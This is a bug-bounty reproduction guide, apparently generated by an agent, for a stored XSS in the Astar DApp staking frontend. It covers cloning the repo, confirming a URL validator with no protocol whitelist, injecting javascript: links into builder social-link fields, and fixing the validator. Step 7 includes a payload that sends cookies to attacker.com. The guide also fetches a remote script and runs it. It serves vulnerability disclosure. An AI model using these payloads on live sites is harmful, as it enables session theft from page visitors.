# 🐍 Astar XSS PoC — Local Fork Setup Guide

This guide lets Immunefi researchers reproduce the Stored XSS vulnerability by running
a local fork of the Astar DApp staking frontend.

**What you'll get:**
- A running Astar UI clone with the vulnerable validator intact
- Ability to register a DApp Builder with `javascript:` URLs
- Visual proof that the XSS payload persists and executes

---

## Prerequisites

```bash
node --version   # ≥18.0.0
npm --version    # ≥9.0.0
git --version    # any recent version
```

---

## Step 1: Clone Astar Frontend

```bash
git clone https://github.com/AstarNetwork/astar-apps.git astar-xss-poc
cd astar-xss-poc
```

If the repo is private or moved, check alternate:
```bash
# Option: use the archived mirror
git clone https://github.com/AstarNetwork/astar-apps.git astar-xss-poc
cd astar-xss-poc
```

---

## Step 2: Install Dependencies

```bash
npm install
```

If installation fails due to node version:
```bash
# Use nvm if available
nvm use 20
npm install
```

---

## Step 3: Locate Vulnerable Validator

Find the vulnerable file:
```bash
find . -name "Validators.ts" -type f 2>/dev/null | xargs grep -l "isUrlValid"
```

Expected path:
```
src/components/common/Validators.ts
```

---

## Step 4: Verify Vulnerability Exists

Check the vulnerable code:

```bash
cat src/components/common/Validators.ts
```

You should see:
```typescript
// ❌ VULNERABLE — No protocol whitelist
export const isUrlValid = (url: string): boolean =>
  url ? validator.isURL(url) : false;
```

---

## Step 5: Run the Node.js Validator PoC

```bash
# From the astar-apps directory
cd ..
node astar-xss-poc/scripts/test-xss-validator.js 2>/dev/null || \
  node /path/to/Astar-bug-report/scripts/test-xss-validator.js

# Or from the bug report repo directly:
node /root/Astar-bug-report/scripts/test-xss-validator.js
```

**Expected output:**
```
╔══════════════════════════════════════════════════════════════════════╗
║  ASTAR STORED XSS — VALIDATOR BYPASS PoC (Node.js)                 ║
╚══════════════════════════════════════════════════════════════════════╝

┌────┬──────────────────────────────┬────────┬───────────┬───────────┐
│ #  │ Payload                       │ Vuln   │ Secure    │ Severity  │
├────┼──────────────────────────────┼────────┼───────────┼───────────┤
│  1 │ Basic javascript: XSS         │ PASS   │ FAIL      │ CRITICAL  │
│  2 │ Cookie steal via fetch        │ PASS   │ FAIL      │ CRITICAL  │
...
│ 15 │ Official docs (benign)        │ PASS   │ PASS      │ SAFE      │
└────┴──────────────────────────────┴────────┴───────────┴───────────┘

✓ ALL TESTS PASSED — VULNERABILITY CONFIRMED
```

---

## Step 6: Manual Browser Verification

### 6a. Start the dev server

```bash
cd astar-xss-poc
npm run dev
```

Open your browser to `http://localhost:8080` (or the port shown).

### 6b. Navigate to DApp Builder Registration

1. Go to DApp Staking section
2. Click "Register DApp" or "Add Builder"
3. Find the "Social Links" or "Builder Info" form section

### 6c. Inject XSS Payload

In each URL field (GitHub, Twitter, LinkedIn), enter:

```text
javascript:alert('XSS from Astar DApp Builder — Stored XSS Confirmed!')
```

### 6d. Submit the Form

Click Submit. The form **will accept** the `javascript:` URL because
`isUrlValid("javascript:alert(...)")` returns `true`.

### 6e. Verify the Payload Persists

1. View the DApp page (the public Builders.vue page)
2. Look for the social link icons (GitHub, Twitter, LinkedIn)
3. Click any social link icon
4. **Alert box appears** — XSS confirmed!

The `javascript:` URL is rendered in the `href` attribute of an `<a>` tag.
When clicked, the browser executes the JavaScript.

---

## Step 7: Verify With Different Payloads

Try these in the form fields:

| Field | Payload | Effect |
|---|---|---|
| GitHub | `javascript:alert(document.domain)` | Shows current domain |
| Twitter | `javascript:alert(document.cookie)` | Shows session cookies |
| LinkedIn | `javascript:void(fetch('https://attacker.com/?c='+document.cookie))` | Exfiltrates cookies |

All three will be accepted by the vulnerable `isUrlValid()` and will execute on page load or click.

---

## Step 8: Verify the Fix Works

Edit `src/components/common/Validators.ts`:

```typescript
// ✅ SECURE — Protocol whitelist
export const isUrlValid = (url: string): boolean =>
  url
    ? validator.isURL(url, {
        protocols: ['http', 'https'],
        require_protocol: true,
        require_tld: true,
      })
    : false;
```

Now restart dev server:
```bash
npm run dev
```

Try to submit `javascript:alert(1)` again — it **will be rejected**.

---

## Quick Test Command (No Browser Required)

For a fast verification without running the full UI:

```bash
# Install validator library
npm install validator

# Run PoC
node scripts/test-xss-validator.js
```

If the library isn't installed in the astar-apps repo:
```bash
cd /tmp
npm init -y && npm install validator
curl -s https://raw.githubusercontent.com/Zerxxz/Astar-bug-report/main/scripts/test-xss-validator.js -o test-xss-validator.js
node test-xss-validator.js
```

---

## Cleanup

```bash
cd ..
rm -rf astar-xss-poc
```

---

## Files in This PoC Package

| File | Purpose |
|---|---|
| `scripts/test-xss-validator.js` | Node.js validator bypass PoC (15 test cases) |
| `src/AstarXSS.t.sol` | Foundry PoC — validator simulation |
| `src/AstarXSSOnChainPoC.t.sol` | Foundry PoC — attack chain |
| `POC.html` | Interactive browser PoC |
| `REPORT.md` | Full security report (Immunefi format) |

---

*Generated by Sapi | Hermes Agent*